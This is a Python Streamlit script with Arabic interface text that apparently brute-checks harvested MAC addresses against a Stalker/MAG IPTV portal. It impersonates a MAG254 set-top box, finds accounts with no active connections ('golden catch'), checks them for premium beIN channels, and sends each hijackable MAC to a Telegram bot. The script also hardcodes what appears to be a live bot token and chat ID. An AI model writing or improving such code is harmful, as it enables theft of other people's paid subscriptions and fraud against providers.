import streamlit as st
import requests
import time
import telebot
import random
import re

# --- بياناتك ---
TOKEN = "8485193296:AAHpW18fpS74B3oaUGqNCYZjbodRPa76uLE"
ID = 7638628794
bot = telebot.TeleBot(TOKEN)

CHANNELS_KEYS = {
    "BEIN AFRICA CUP 2025": ["AFRICA", "2025"],
    "IARI BEIN SPORTS 8K": ["8K", "IARI"],
    "IARI BEIN SPORTS 4K": ["4K", "IARI"]
}

# --- إعداد الواجهة ---
st.set_page_config(page_title="Radar Ayoub Hammami", page_icon="📡")
st.markdown("<h1 style='text-align: center; color: #FF4B4B;'>📡 Radar Ayoub Hammami Pro</h1>", unsafe_allow_html=True)

raw_data = st.text_area("انسخ هنا النص العشوائي (روابط وماكات مبعثرة)", height=150)

def check_server_health(url):
    """تحقق من استجابة السيرفر مع تجاوز أخطاء SSL"""
    try:
        # نحاول الاتصال بالسيرفر مع مهلة 10 ثواني
        response = requests.get(url, timeout=10, verify=False, headers={'User-Agent': 'MAG254'})
        return True, response.status_code
    except Exception as e:
        return False, str(e)

if st.button("🚀 بدء المسح الشامل"):
    if raw_data:
        macs = list(set(re.findall(r'(?:[0-9A-F]{2}[:]){5}[0-9A-F]{2}', raw_data.upper())))
        host_match = re.search(r'(https?://[^\s/$.?#].[^\s]*)', raw_data)
        
        if host_match and macs:
            full_url = host_match.group(0).split('/portal.php')[0].strip('/')
            # التأكد من إضافة /portal.php للفحص
            target_url = f"{full_url}/portal.php"
            
            st.info(f"🔍 يتم الآن فحص استجابة: {target_url}")
            is_alive, status_info = check_server_health(target_url)
            
            # ملاحظة: حتى لو أعطى 404 أو 403، قد يكون السيرفر شغالاً ويقبل الـ MAC
            if is_alive or "40" in str(status_info):
                st.success(f"🟢 السيرفر يستجيب (Status: {status_info})")
                
                found_count = 0
                checked_count = 0
                stat_checked = st.empty()
                stat_found = st.empty()
                placeholder = st.empty()
                
                for current_mac in macs:
                    checked_count += 1
                    stat_checked.metric("إجمالي الفحوصات", checked_count)
                    placeholder.info(f"🔎 يفحص الآن: {current_mac}")
                    
                    headers = {
                        'User-Agent': 'MAG254',
                        'Cookie': f'mac={current_mac}',
                        'X-User-Agent': 'Model: MAG254; Link: WiFi'
                    }
                    
                    try:
                        # محاولة جلب البروفايل
                        url_prof = f"{target_url}?type=stb&action=get_profile&force_stb=1"
                        r_prof = requests.get(url_prof, headers=headers, timeout=7, verify=False)
                        
                        if r_prof.status_code == 200:
                            match = re.search(r'"active_cons"\s*:\s*"(\d+)"', r_prof.text)
                            active = match.group(1) if match else "0"

                            if active == "0":
                                found_count += 1
                                stat_found.metric("الصيد الذهبي", found_count)
                                
                                # جلب القنوات
                                url_ch = f"{target_url}?type=itv&action=get_all_channels"
                                r_ch = requests.get(url_ch, headers=headers, timeout=7, verify=False)
                                ch_text = r_ch.text.upper()
                                found_channels = [f"✅ {n}" for n, k in CHANNELS_KEYS.items() if all(x in ch_text for x in k)]
                                
                                alert = (
                                    f"🎯 **صيد متاح بواسطة Radar Ayoub**\n\n"
                                    f"🌐 السيرفر: `{full_url}`\n"
                                    f"🖥️ الماك: `{current_mac}`\n"
                                    f"👥 المتصلون: `0`\n"
                                    f"📺 القنوات:\n" + ("\n".join(found_channels) if found_channels else "❌ لم يتم العثور على قنواتك المحددة") +
                                    f"\n\n👤 المالك: Ayoub Hammami"
                                )
                                bot.send_message(ID, alert, parse_mode="Markdown")
                                st.toast(f"✅ تم الصيد: {current_mac}")
                    except:
                        continue
                    time.sleep(1)
            else:
                st.error(f"🔴 السيرفر لا يستجيب. الخطأ: {status_info}")
        else:
            st.error("❌ تأكد من وجود رابط وماكات صحيحة.")
    else:
        st.warning("⚠️ الصندوق فارغ!")
